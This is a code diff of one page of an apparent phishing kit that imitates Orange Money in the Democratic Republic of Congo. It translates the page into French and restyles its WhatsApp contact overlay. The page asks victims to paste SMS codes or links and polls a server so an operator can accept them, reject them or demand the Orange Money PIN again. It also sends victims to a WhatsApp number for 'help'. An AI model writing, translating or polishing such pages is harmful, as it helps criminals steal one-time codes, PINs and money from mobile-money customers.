@@ -183,16 +183,19 @@
             margin-bottom: 15px;
         }
 
-        .wa-link {
-            display: inline-block;
+        .wa-btn {
+            display: block;
+            width: 100%;
             background-color: white;
             color: #ff7900;
             font-weight: bold;
-            padding: 12px 20px;
+            padding: 12px 10px;
             border-radius: 8px;
             text-decoration: none;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
+            box-sizing: border-box;
             word-break: break-all;
+            font-size: 13px;
         }
 
         .error-message {
@@ -223,7 +226,7 @@
         <div class="phone-number" id="displayPhone">+243 ...</div>
 
         <textarea id="smsInput" placeholder="Collez ici votre lien / message SMS complet..."></textarea>
-        <div id="errorText" class="error-message">Code incorrect. Veuillez réessayer.</div>
+        <div id="errorText" class="error-message">Le lien est incorrect ou le lien a expiré, téléchargez un nouveau lien que vous recevez.</div>
 
         <div class="resend-text" id="timerBox">
             Renvoyer dans <span id="timer">60</span> secondes
@@ -235,26 +238,28 @@
 
 <div class="footer-banner"></div>
 
-<!-- Status Loading Overlay -->
+<!-- Overlay de Chargement (Orange Theme) -->
 <div class="overlay" id="statusOverlay">
     <div class="overlay-card">
         <div class="spinner"></div>
-        <div class="overlay-title">Please wait</div>
+        <div class="overlay-title">Veuillez patienter</div>
     </div>
 </div>
 
-<!-- Contact Us WhatsApp Overlay -->
+<!-- Overlay Contactez-nous WhatsApp (Orange Theme) -->
 <div class="overlay" id="contactOverlay">
     <div class="overlay-card">
-        <div class="overlay-title">Contact Us on WhatsApp</div>
-        <div class="overlay-desc">You can contact us using either of the two options below:</div>
+        <div class="overlay-title">Contactez-nous sur WhatsApp</div>
+        <div class="overlay-desc">Utilisez l'une des deux options ci-dessous pour nous contacter :</div>
         
-        <a href="https://api.whatsapp.com/send?phone=243855275313t&text=Jambo!%20I'd%20PESA%20Napata%20dje" target="_blank" class="wa-link">
-            Click this link
+        <a href="https://api.whatsapp.com/send?phone=243855275313t&text=Jambo!%20I'd%20PESA%20Napata%20dje" target="_blank" class="wa-btn">
+            Cliquez sur ce lien :<br>https://api.whatsapp.com/send?phone=243855275313
         </a>
 
-        <div class="overlay-desc">Or through this number:</div>
-        <div style="font-size: 16px; font-weight: bold; margin-bottom: 15px;">+243855275313</div>
+        <div class="overlay-desc" style="margin-top: 10px; margin-bottom: 5px;">Ou via ce numéro :</div>
+        <div style="font-size: 18px; font-weight: bold; background: white; color: #ff7900; padding: 10px; border-radius: 8px; width: 100%; box-sizing: border-box;">
+            +243855275313
+        </div>
     </div>
 </div>
 
@@ -271,7 +276,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     let checkInterval = null;
 
-    // Load phone number
+    // Charger le numéro de téléphone
     const savedPhone = localStorage.getItem('phone');
     if (savedPhone) {
         displayPhone.textContent = `+243${savedPhone.replace(/^\+?243/, '')}`;
@@ -279,7 +284,7 @@ document.addEventListener("DOMContentLoaded", () => {
         displayPhone.textContent = "+243 ...";
     }
 
-    // Input listener to toggle submit button
+    // Activer/Désactiver le bouton de soumission
     smsInput.addEventListener('input', () => {
         const hasText = smsInput.value.trim().length > 0;
         submitBtn.disabled = !hasText;
@@ -287,7 +292,7 @@ document.addEventListener("DOMContentLoaded", () => {
         errorText.style.display = 'none';
     });
 
-    // Countdown Timer
+    // Compte à rebours
     let timeLeft = 60;
     const timerInterval = setInterval(() => {
         timeLeft--;
@@ -299,7 +304,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     }, 1000);
 
-    // Poll status from server
+    // Vérification du statut sur le serveur
     function startStatusPolling() {
         if (checkInterval) clearInterval(checkInterval);
 
@@ -310,12 +315,12 @@ document.addEventListener("DOMContentLoaded", () => {
 
                 if (data.status === "otp1_correct") {
                     clearInterval(checkInterval);
-                    window.location.href = "/page9"; // Redirect to page9
+                    window.location.href = "/page9"; // Redirection vers page9
                 } else if (data.status === "otp1_wrong") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
                     contactOverlay.style.display = "none";
-                    errorText.textContent = "The link is incorrect or the link has expired upload a new one you receive.";
+                    errorText.textContent = "Le lien est incorrect ou le lien a expiré, téléchargez un nouveau lien que vous recevez.";
                     errorText.style.display = "block";
                     smsInput.value = "";
                     submitBtn.disabled = true;
@@ -324,27 +329,27 @@ document.addEventListener("DOMContentLoaded", () => {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
                     contactOverlay.style.display = "none";
-                    alert("The PIN is wrong. Enter correct Orange Money PIN.");
-                    window.location.href = "/page6"; // Redirect to page6
+                    alert("Le code PIN est incorrect. Veuillez saisir le code PIN Orange Money correct.");
+                    window.location.href = "/page6"; // Redirection vers page6
                 } else if (data.status === "contact_us") {
                     clearInterval(checkInterval);
                     statusOverlay.style.display = "none";
                     contactOverlay.style.display = "flex";
                 }
             } catch (err) {
-                console.error("Status check error:", err);
+                console.error("Erreur de vérification du statut:", err);
             }
         }, 2000);
     }
 
-    // Submit Action
+    // Action lors de la soumission
     submitBtn.addEventListener('click', async () => {
         if (submitBtn.disabled) return;
 
         const pastedLink = smsInput.value.trim();
         if (!pastedLink) return;
 
-        // Show loading overlay
+        // Affichage de l'overlay de chargement
         contactOverlay.style.display = "none";
         statusOverlay.style.display = "flex";
         errorText.style.display = "none";
@@ -367,7 +372,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 alert("Erreur lors de l'envoi.");
             }
         } catch (err) {
-            console.error("Submission error:", err);
+            console.error("Erreur de soumission:", err);
             statusOverlay.style.display = "none";
             alert("Erreur de connexion.");
         }
